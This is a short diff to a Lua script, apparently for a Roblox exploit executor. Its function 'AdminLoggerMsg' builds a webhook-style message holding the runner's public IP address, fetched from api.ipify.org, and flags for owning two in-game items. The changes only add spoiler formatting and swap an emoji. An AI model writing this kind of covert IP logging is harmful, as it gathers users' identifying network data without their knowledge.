@@ -144,7 +144,7 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
                 },
                 {
                     name   = "**🌇IP Address**",
-                    value  = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                    value  = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||",
                     inline = false
                 },
                 {
@@ -165,7 +165,7 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
                     inline = false
                 },
                 {
-                    name   = "️🏆God's Chalice",
+                    name   = "️♜ God's Chalice",
                     value  = hasGodsChalice and "✅" or "❌",
                     inline = true
                 },
